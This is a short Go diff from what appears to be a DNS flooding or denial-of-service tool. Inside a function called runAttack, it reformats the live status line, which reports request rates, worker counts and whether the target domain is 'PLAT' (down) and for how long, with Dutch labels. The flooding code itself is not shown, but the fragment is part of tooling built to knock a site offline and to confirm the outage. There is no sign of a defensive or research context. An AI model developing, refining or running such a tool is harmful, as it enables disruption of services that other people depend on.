@@ -884,17 +884,19 @@ func runAttack(ctx context.Context, client *dns.Client, resolver, domain string,
 			reqPerSec := float64(atomic.LoadInt64(&totalRequests)) / elapsed
 			
 			isDown := atomic.LoadInt32(&siteDown) == 1
-			status := "🟢 ONLINE"
+			var statusInfo string
 			if isDown {
 				mu.Lock()
 				downDuration := time.Since(siteDownSince).Round(time.Second)
 				mu.Unlock()
-				status = fmt.Sprintf("🔴 PLAT (%v)", downDuration)
+				statusInfo = fmt.Sprintf("PLAT (%v)", downDuration)
+			} else {
+				statusInfo = "ONLINE"
 			}
 			
-			fmt.Printf("\r[%s] Requests: %d | Success: %d | Failed: %d | %.0f req/s | Workers: %d | Tijd over: %v",
-				status, atomic.LoadInt64(&totalRequests), atomic.LoadInt64(&successRequests), 
-				atomic.LoadInt64(&failedRequests), reqPerSec, currentWorkers, remaining)
+			fmt.Printf("Requests: %d | Success: %d | Failed: %d | %.0f req/s | Workers: %d | Status: %s | Tijd over: %v\n",
+				atomic.LoadInt64(&totalRequests), atomic.LoadInt64(&successRequests), 
+				atomic.LoadInt64(&failedRequests), reqPerSec, currentWorkers, statusInfo, remaining)
 				
 		case <-attackCtx.Done():
 			return attackCtx.Err()
